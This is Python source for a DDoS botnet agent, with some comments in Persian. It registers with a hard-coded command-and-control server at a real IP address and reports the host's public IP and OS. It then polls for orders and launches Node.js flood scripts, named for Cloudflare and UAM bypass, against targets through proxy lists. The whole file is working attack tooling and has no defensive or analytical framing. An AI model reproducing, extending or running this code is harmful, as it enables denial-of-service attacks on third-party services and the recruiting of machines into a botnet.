import requests
import time
import platform
import uuid
import subprocess
import os
import threading

# ========== CONFIG ==========
C2_URL = "http://46.101.241.66:8083"
ZOMBIE_ID = str(uuid.uuid4())[:8]
CHECK_INTERVAL = 5

# مسیر فایل‌های Node.js
NODE_SCRIPTS = {
    "TLS.js": "TLS.js",
    "GOD.js": "GOD.js",
    "UAM-BYPASS.js": "UAM-BYPASS.js",
    "DESTROY.js": "DESTROY.js",
    "HTTPS.js": "HTTPS.js",
    "bypassUAM.js": "bypassUAM.js",
    "CFBYPASS.js": "CFBYPASS.js"
}

running_attacks = {}  # {attack_key: process}

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "unknown"

def register():
    data = {
        "id": ZOMBIE_ID,
        "ip": get_public_ip(),
        "os": f"{platform.system()} {platform.release()}",
        "version": "1.0"
    }
    try:
        r = requests.post(f"{C2_URL}/api/register", json=data, timeout=10)
        return r.status_code == 200
    except:
        return False

def heartbeat():
    data = {"id": ZOMBIE_ID}
    try:
        r = requests.post(f"{C2_URL}/api/heartbeat", json=data, timeout=10)
        if r.status_code == 200:
            return r.json().get('commands', [])
    except:
        pass
    return []

def run_attack(cmd):
    target = cmd.get('target')
    t = cmd.get('time')
    power = cmd.get('power')
    
    # محاسبه تعداد ترد بر اساس قدرت (1 تا 100)
    threads = max(1, int(power / 10))
    # تعداد ریکوئست در ثانیه
    rate = max(1, int(power))
    
    # انتخاب اسکریپت بر اساس قدرت
    if power > 70:
        script = "UAM-BYPASS.js"
    elif power > 40:
        script = "TLS.js"
    else:
        script = "GOD.js"
    
    # اجرای دستور
    cmd_line = ["node", script, target, str(t), str(rate), str(threads)]
    
    # برای اسکریپت‌هایی که پروکسی لازم دارن
    if script in ["UAM-BYPASS.js", "GOD.js", "TLS.js"]:
        cmd_line.append("proxy.txt")
    
    print(f"[*] Starting attack: {' '.join(cmd_line)}")
    
    try:
        proc = subprocess.Popen(cmd_line, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        key = f"{target}_{int(time.time())}"
        running_attacks[key] = proc
        return key
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return None

def stop_all_attacks():
    print("[*] Stopping all attacks...")
    for key, proc in list(running_attacks.items()):
        try:
            proc.terminate()
            print(f"[-] Stopped: {key}")
        except:
            pass
        del running_attacks[key]

if __name__ == "__main__":
    print(f"[*] Zombie {ZOMBIE_ID} starting...")
    while not register():
        print("[-] Failed to register, retrying in 10s...")
        time.sleep(10)
    
    print("[+] Registered to C2.")
    
    while True:
        cmds = heartbeat()
        for cmd in cmds:
            if cmd.get('cmd') == 'attack':
                run_attack(cmd)
            elif cmd.get('cmd') == 'stop':
                stop_all_attacks()
        time.sleep(CHECK_INTERVAL)